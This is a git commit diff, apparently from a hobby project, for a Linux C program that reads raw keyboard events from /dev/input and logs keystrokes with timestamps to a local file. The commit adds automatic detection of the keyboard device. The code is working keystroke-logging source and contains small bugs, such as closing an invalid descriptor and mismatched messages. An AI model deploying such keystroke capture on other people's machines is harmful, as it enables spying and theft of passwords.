142e1bee49a7f9057737c0d35a947932c01fd41e
Decay <0_0o@tutamail.com>
2026-04-08 09:44:12 -0300

    procurar /dev/input/eventX automaticamente

--- main.c
+++ main.c
@@ -2,6 +2,8 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
+#include <string.h>
+#include <sys/ioctl.h>
 #include <time.h>
 
 // tabela de teclas normais
@@ -11,6 +13,47 @@ char teclas[200] = {
     0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
     '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
 };
+
+
+int procurar_teclado(){
+    printf("Procurando teclado..\n");
+    printf("------------------------\n");
+    
+    for(int i = 0; i <= 15; i++){
+        char caminho[50];
+        sprintf(caminho, "/dev/input/event%d", i); // testa event0 até event15
+
+        int fd = open(caminho, O_RDONLY);
+        if(fd != -1){
+            char nome[256] = {0};
+           // tenta ler o nome do dispositivo
+            if(ioctl(fd, EVIOCGNAME(sizeof(nome)), nome) != -1){
+                printf("event%d: %s\n", i, nome);
+             // palavras chaves que possam indicar que é teclado para facilitar identificação
+                if(strstr(nome, "keyboard") || strstr(nome, "Keyboard") ||
+                   strstr(nome, "Key") || strstr(nome, "kbd") ||
+                   strstr(nome, "AT") || strstr(nome, "Set")){
+                    printf("\n Encontrado, usando /dev/input/event%d", i, nome);
+                      
+                return fd;
+                }
+            }
+        }
+        close(fd);
+    }
+    
+
+ // caso não achar pelo nome
+   printf("Não achado pelo nome, tentando event1..\n");
+   int fd = open("/dev/input/event2", O_RDONLY);
+   if(fd != -1){
+    printf("Usado event2, talvez seja teclado..\n");
+    return fd;
+   }
+   return -1;
+
+}
+
 
 // funcao pra pegar o horario 
 void pegar_horario(char *buffer, int tamanho) {
@@ -23,29 +66,30 @@ void pegar_horario(char *buffer, int tamanho) {
 }
 
 int main() {
-    int tec;
-    struct input_event e;
-    int shift = 0;
+    int tec = procurar_teclado();
     
-    tec = open("/dev/input/event2", O_RDONLY);
     
-    if(tec == -1) {
-        printf("abriu nao, tenta com sudo\n");
+    if(tec == -1 ){
+        printf("Não achou nada!\n");
+        printf("Tenta sudo ./nome_do_progama\n");
         return 1;
     }
-    
+        
     printf("teclado funcionando, aperta ctrl+c pra parar\n");
     
     FILE *log = fopen("log.txt", "a");
     if(log == NULL) {
-        printf("deu erro no arquivo\n");
+        printf("deu erro no arquivo log.txt\n");
         return 1;
     }
+        struct input_event e;
+    int shift = 0;
     
     while(1) {
         int r = read(tec, &e, sizeof(e));
         
         if(r < 0) {
+            printf("Erroa ao ler /dev");
             break;
         }
         
